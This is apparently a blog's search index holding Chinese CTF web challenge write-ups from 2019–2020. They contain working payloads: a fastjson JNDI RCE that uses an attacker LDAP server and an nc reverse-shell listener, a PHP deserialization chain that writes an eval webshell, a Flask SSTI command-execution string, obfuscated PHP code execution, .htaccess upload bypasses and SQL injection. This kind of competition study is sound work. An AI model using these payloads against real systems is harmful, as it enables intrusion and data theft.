<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0410随笔</title>
    <url>/2020/04/10/0410%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<h1><span id="0410随笔">0410随笔</span></h1><h2><span id="最近咕咕咕的一些学习">最近咕咕咕的一些学习</span></h2><h3><span id="对mysql注入相关内容及部分trick的归类小结">对MYSQL注入相关内容及部分Trick的归类小结</span></h3><p><a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169</a></p>
<h3><span id="一道题引发的无列名注入">一道题引发的无列名注入</span></h3><p><a href="https://www.chabug.org/ctf/852.html" target="_blank" rel="noopener">https://www.chabug.org/ctf/852.html</a></p>
<h3><span id="oracle-sql注入学习">Oracle SQL注入学习</span></h3><p><a href="https://www.chabug.org/web/1351.html" target="_blank" rel="noopener">https://www.chabug.org/web/1351.html</a></p>
<h3><span id="反序列利用链">反序列利用链</span></h3><p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/?from=timeline&amp;isappinstalled=0</a></p>
<h3><span id="pdo场景下的sql注入探究">PDO场景下的SQL注入探究</span></h3><p><a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">https://xz.aliyun.com/t/3950</a></p>
<h3><span id="bypass-information_schema">bypass information_schema</span></h3><p><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
<h3><span id="无需暴破还原mt_rand种子">无需暴破还原mt_rand()种子</span></h3><p><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p>
]]></content>
  </entry>
  <entry>
    <title>2019EIS_Web</title>
    <url>/2019/11/25/2019EIS-Web/</url>
    <content><![CDATA[<h1><span id="2019安全运维挑战赛web_wp">2019安全运维挑战赛Web_Wp</span></h1><p>[TOC]</p>
<h2><span id="ezbypass">ezbypass</span></h2><p><img src="/2019/11/25/2019EIS-Web/1.png" alt><br>查看phpinfo<code>http://111.186.57.61:10101/?src=&amp;cmd=phpinfo();</code><br>发现设置了<code>open_basedir</code>:<code>/var/www/html/:/tmp</code><br>绕过<code>open_basedir</code>康康flag在哪</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://111.186.57.61:10101/?cmd=mkdir(&apos;/tmp/fuck&apos;);chdir(&apos;/tmp/fuck&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);var_dump(scandir(&apos;/&apos;));</span><br><span class="line">或者用glob</span><br><span class="line">http://111.186.57.61:10101/?cmd=$a=&quot;glob:///*&quot;;if($b=opendir($a) ) &#123; while ( ($file = readdir($b)) !== false ) &#123; echo &quot;filename:&quot;.$file.&quot;\n&quot;; &#125;closedir($b); &#125;</span><br></pre></td></tr></table></figure>

<p>有个<code>flag</code>和<code>/readflag</code>让我们执行<code>/readflag</code>来读flag<br>常见的执行系统函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>

<p>全部禁用了，那就只能绕<code>disable_functions</code>但是我没遇见过，在<code>/tmp</code>看到了他们的payload，顺便谷歌了一下下<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>最后include /tmp下文件<br><code>http://111.186.57.61:10101/?cmd=include(%22/tmp/a12.php%22);</code></p>
<h2><span id="ezcms">ezcms</span></h2><h2><span id="ezjava">ezjava</span></h2><p><code>\WEB-INF\lib</code>目录下有<code>fastjson-1.2.47.jar</code>文件，谷歌下，估计是前个把月出的<code>fastjson-1.2.47-RCE</code>刚刚好复现一波（脚本小子上线…..</p>
<p>####Ubuntu安装jdk8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure>

<h4><span id="测试外连">测试外连</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">param=&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:port/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在自己vps上<code>nc -lvvp port</code>监听服务器有流量就可以继续打</p>
<h4><span id="修改exploit并编译成class文件">修改Exploit并编译成class文件</span></h4><p>将<code>Exploit.java</code>文件内的<code>ip</code>和<code>port</code>改为自己<code>vps</code>的,编译<code>Exploit.java</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<h4><span id="准备ldap服务web服务和nc正在准备接收反弹回来的shell">准备LDAP服务，Web服务和nc正在准备接收反弹回来的SHELL</span></h4><p>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://IP:port_1/#Exploit</span><br></pre></td></tr></table></figure>

<p>在当前目录下运行Web服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server port_1</span><br></pre></td></tr></table></figure>

<p>nc正在准备接收反弹回来的SHELL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure>

<h4><span id="最终执行">最终执行</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">param=&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="ezupload">ezupload</span></h2><p>F12有<code>&lt;!---/.login.php.swp--&gt;</code>拿到<code>login.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($username))&#123;</span><br><span class="line">    $sql = <span class="string">"select password from user where name=?"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($stmt = $mysqli-&gt;prepare($sql)) &#123;</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($dpasswd);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> ($dpasswd === $password)&#123;</span><br><span class="line">	    $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            header(<span class="string">"Location: /upload.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: /index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>

<p>用了预编译，注入可能不太好使了<br>但是在<code>login.php</code>里<code>$dpasswd</code>没有定义所以如果查询一个不存在的用户名，它的值为NULL<br>抓包将<code>&amp;password=</code>删除，后端就会把<code>pasword</code>这个变量值为NULL，绕过登录<br><img src="/2019/11/25/2019EIS-Web/2.png" alt><br>然后就是个上传<br><img src="/2019/11/25/2019EIS-Web/3.png" alt><br>常规操作<br><img src="/2019/11/25/2019EIS-Web/5.png" alt><br>然后看到回显<code>/tmp</code>我以为上传到<code>/tmp</code>目录下了，然后就卡住了，结果赛后才知道在<code>./uploads</code>下…..明明是的没有弱密码和不需要使用扫描器的…..<br>蚁剑直接连拿flag</p>
<h2><span id="ezpop">ezpop</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__destruct() -&gt; save() -&gt; getForStorage() -&gt; cleanContents() -&gt; set() -&gt; getExpireTime() -&gt; getCacheKey() -&gt; serialize() -&gt; file_put_contents()</span><br></pre></td></tr></table></figure>

<p>我们要控制<code>B::set()</code>内的<code>$filename, $data</code><br>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//class A</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    protected $store = (new B());</span></span><br><span class="line"><span class="comment">//    protected $key = "exp.php";</span></span><br><span class="line"><span class="comment">//    protected $expire;</span></span><br><span class="line"><span class="comment">//    public $autosave;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key = <span class="string">"1.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span> -&gt; complete = [<span class="string">"1"</span>];</span><br><span class="line">        <span class="keyword">$this</span> -&gt; cache = [<span class="string">"PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+"</span>];</span><br><span class="line">        <span class="keyword">$this</span> -&gt; expire =<span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] = <span class="string">"php://filter/write=string.strip_tags|convert.base64-decode/resource=./uploads/"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>]=<span class="string">'trim'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($class));</span><br></pre></td></tr></table></figure>

<h2><span id="ezwaf">ezwaf</span></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $newarr = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($val))</span><br><span class="line">        &#123;</span><br><span class="line">            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $newarr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET= escape($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select age from user where name='$name'"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'age'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $age = $_GET[<span class="string">'age'</span>];</span><br><span class="line">    mysqli_query($mysqli, <span class="string">"select name from user where age=$age"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所有<code>GET</code>请求的参数都经过了<code>mysqli_real_escape_string()</code>处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqli_real_escape_string()</span><br><span class="line">需要进行转义的字符串。</span><br><span class="line">会被进行转义的字符包括： NUL （ASCII 0），\n，\r，\，&apos;，&quot; 和 Control-Z.</span><br></pre></td></tr></table></figure>

<p>但是它<code>age</code>参数不需要’ “就可以注入<br>尝试注入<code>http://111.186.57.43:10601/?src=&amp;age=0and sleep(3)</code>发现出现<code>403</code><br>和<code>RoarCTF</code>的<code>easy_calc</code>一样，中间反向代理服务器有WAF，可以用<code>CL-CL</code>HTTP请求走私漏洞<br><img src="/2019/11/25/2019EIS-Web/6.png" alt></p>
]]></content>
  </entry>
  <entry>
    <title>2019NCTF_Web_Wp</title>
    <url>/2019/11/25/2019NCTF-Web-Wp/</url>
    <content><![CDATA[<h1><span id="2019nctf_web">2019NCTF_Web</span></h1><h2><span id="fake-xml-cookbook">Fake XML cookbook</span></h2><p>抓包，推测<code>username</code>处可能有XXE漏洞<br>（和UNCTF新星赛前端一样，直接拿payload打<br><img src="/2019/11/25/2019NCTF-Web-Wp/2.png" alt><br>直接xxepauload上<br><img src="/2019/11/25/2019NCTF-Web-Wp/1.png" alt></p>
<h2><span id="true-xml-cookbook">True XML cookbook</span></h2><p>和第一题同一个地方有<code>xxe</code>，根目录和其他地方下找不到<code>flag</code>。。。，猜测可能是放到内网</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/proc/net/fib_trie  路由树</span><br><span class="line">/etc/hosts  linux系统中负责ip地址与域名快速解析的文件</span><br><span class="line">/proc/net/arp</span><br></pre></td></tr></table></figure>

<p>贼多ip没找了</p>
<h2><span id="sqli">SQLi</span></h2><p>和i春秋第一季那个题一样,只不过那个有回显，这个换成302跳转<br>具体见上上上上上上上篇有脚本</p>
<h2><span id="easyphp">easyphp</span></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="第一关">第一关</span></h3><p>用<code>%0a</code>绕过<code>preg_match</code></p>
<h3><span id="第二关">第二关</span></h3><p>传入一个数字<code>str1</code>再传入任意的字符<code>str2</code>，两个参数的md5要不同，两个参数的md5再经过<code>strtr()</code>将<code>c</code>替换为<code>0</code>后（因为md5肯定没有<code>xhp</code>这三个字符），两个md5又相同<br>利用php弱类型，<code>0e</code>在php里面是科学计数法(<code>===</code>比较两个变量的值和类型；<code>==</code>比较两个变量的值，不比较数据类型,如果两者类型不同则类型转换之后再对比<br><img src="/2019/11/25/2019NCTF-Web-Wp/10.png" alt><br><img src="/2019/11/25/2019NCTF-Web-Wp/9.png" alt><br><code>str1</code>找一个md5后<code>0e</code>开头后面字母只有<code>c</code>的值，<code>md5(&quot;2120624&quot;) ==&gt; &quot;0e85776838554cc1775842c212686416&quot;</code><br><code>str2</code>找一个md5后<code>0e</code>开头的,后面全是数字的值，<code>s878926199a</code>(百度0e开头的md5，一堆</p>
<h3><span id="第三关">第三关</span></h3><p>之前安恒月赛的一道题，<code>奇怪的恐龙特性</code>在GET请求里<code>.</code>是换成<code>_</code>的<br>列目录除了<code>ls</code>还有<code>dir</code><br>读取文件除了<code>cat</code>还有<code>more、less、head、tail</code><br>长度限制用通配符<code>*</code>绕过<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http://nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=QNKCDZO&amp;q.w.q=tail%20f*</span><br></pre></td></tr></table></figure>

<h2><span id="flask">flask</span></h2><p>ssti没有过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:40007/&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;cat /fla*&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="flask_website">flask_website</span></h2><h2><span id="upload-your-shell">Upload your Shell</span></h2><p>找到上传点<br><img src="/2019/11/25/2019NCTF-Web-Wp/3.png" alt><br>文件名基于白名单，apache解析漏洞绕不过。。<br>文件上传改文件头和绕过<code>&lt;?</code><br><img src="/2019/11/25/2019NCTF-Web-Wp/4.png" alt><br>然后才发现有文件包含，直接将上传的图片包含，解析成php<br>(我还连了半天蚁剑<br><img src="/2019/11/25/2019NCTF-Web-Wp/5.png" alt></p>
<h2><span id="simple_xss">simple_xss</span></h2><h2><span id="hacker_backdoor">hacker_backdoor</span></h2><p>inctf原题嘛，之前博客都没怎么好好写<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60004/?useful=./&amp;code=$x=ch.r;$d=va.$x(114).$x(95).dump;$g=glo.b;$d($g($x(47).$x(42)));</span><br><span class="line">http://nctf2019.x1ct34m.com:60004/?useful=./&amp;code=$a=p.r.o.c.(%a0^%ff).o.p.e.n;$a((%d0^%ff).r.e.a.d.F.l.a.g.(%c1^%ff).(%d0^%ff).t.m.p.(%d0^%ff).h=d.k.k,array(),$z);</span><br><span class="line">http://nctf2019.x1ct34m.com:60004/?useful=./&amp;code=$x=c.hr;$f=va.$x(114).$x(95).dump;$g=fil.e;$a=$x(47).tmp.$x(47).x;$f($g($a));</span><br></pre></td></tr></table></figure>

<h2><span id="replace">replace</span></h2><p>查看<code>hint.php</code>,提示<code>使用php5.6+bootstrap进行开发</code>,找了一会<code>bootstrap</code>的漏洞，只有xss。。。<br>随便尝试了一下发现命令执行了。。<br><img src="/2019/11/25/2019NCTF-Web-Wp/8.png" alt><br>读取根目录下文件<br><img src="/2019/11/25/2019NCTF-Web-Wp/6.png" alt><br>发现有waf，过滤了了<code>system `` &quot;&quot;</code>等<br><code>sub=phpinfo()1&amp;pat=1&amp;rep=print(file_get_contents(chr(46).chr(47).(index).chr(46).(php)))</code><br>用chr()可以避免用引号<br><img src="/2019/11/25/2019NCTF-Web-Wp/7.png" alt></p>
<h2><span id="phar-matches-everything">phar matches everything</span></h2><p>提示<code>I hate VIM.</code></p>
<h2><span id="肯定有swp文件泄露源码没找到">肯定有<code>swp</code>文件，泄露源码，没找到。。。</span></h2><h2><span id="友链">友链</span></h2><p>ak了Web题大师傅的<a href="https://nikoeurus.github.io/2019/11/25/2019NJUPTctf-wp/" target="_blank" rel="noopener">博客</a><br>（<a href="http://dkk.ink/about/" target="_blank" rel="noopener">友链集合</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020_TgHack</title>
    <url>/2020/04/12/2020-TgHack/</url>
    <content><![CDATA[<h1><span id="tghack_2020_web">TgHack_2020_Web</span></h1><h2><span id="shopeasy">Shop（easy）</span></h2><p>题目就给了我们100刀，并且可以借$200，我们购买Flag要$1337，发现购买不存在的商品且提交为负数他会退款<br>exp:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/store</span><br><span class="line">id=9999&amp;sum=-2000</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/12/2020-TgHack/1.png" alt></p>
<h2><span id="redux">Redux</span></h2><p>js里面找到flag<br><img src="/2020/04/12/2020-TgHack/3.png" alt></p>
<h2><span id="exfiltration">Exfiltration</span></h2><p>Xss我打了半天没打到，戴师傅一次成功，玄学<br><img src="/2020/04/12/2020-TgHack/2.png" alt></p>
<h2><span id="bobby">Bobby</span></h2><p>exp:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new_pass:  &apos;,pass=123456, user=&quot;bobby&quot; WHere 1 or pass=? or pass=? --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/12/2020-TgHack/4.png" alt></p>
<h2><span id="zero">zero</span></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;nettle/sha2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;nettle/sha3.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compute_sha3_256</span><span class="params">(<span class="keyword">char</span> *digest, <span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sha3_256_ctx</span> <span class="title">ctx</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    sha3_256_init(&amp;ctx);</span><br><span class="line">    sha3_256_update(&amp;ctx, strnlen(str, BUF_SIZE), str);</span><br><span class="line">    sha3_256_digest(&amp;ctx, SHA3_256_DIGEST_SIZE, digest);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compute_sha256</span><span class="params">(<span class="keyword">char</span> *digest, <span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sha256_ctx</span> <span class="title">ctx</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">    sha256_init(&amp;ctx);</span><br><span class="line">    sha256_update(&amp;ctx, strnlen(str, BUF_SIZE), str);</span><br><span class="line">    sha256_digest(&amp;ctx, SHA256_DIGEST_SIZE, digest);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compute_hash</span><span class="params">(<span class="keyword">char</span> *digest, <span class="keyword">char</span> *password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> sha256_dgst[BUF_SIZE + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    compute_sha256(sha256_dgst, password);</span><br><span class="line">    compute_sha3_256(digest, sha256_dgst);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不懂 之后学习带师傅们</p>
<h2><span id="files">Files</span></h2>]]></content>
  </entry>
  <entry>
    <title>2020De1CTF_Web_Wp</title>
    <url>/2020/05/04/2020De1CTF-Web-Wp/</url>
    <content><![CDATA[<h1><span id="2020de1ctf_web_wp">2020De1CTF_Web_Wp</span></h1><p>[TOC]</p>
<h2><span id="check-in">check in</span></h2><h3><span id="非预期">非预期</span></h3><p>文件名过滤了<code>ph</code><br>文件内容过滤了<code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</code><br>考虑上传<code>.htaccess</code><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .xxx</span><br></pre></td></tr></table></figure>

<p>利用<code>\</code>换行来绕过过滤<br>文件内容利用php短标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= system(<span class="string">"cat /flag"</span>);</span><br></pre></td></tr></table></figure>

<h3><span id="预期解">预期解</span></h3><p>利用<code>cgi</code><br>payload(题目环境我没试成功，但是是可行的<br>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xxx</span><br></pre></td></tr></table></figure>

<p>1.xxx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">touch 3.txt</span><br><span class="line">cp /flag* ./3.txt</span><br></pre></td></tr></table></figure>

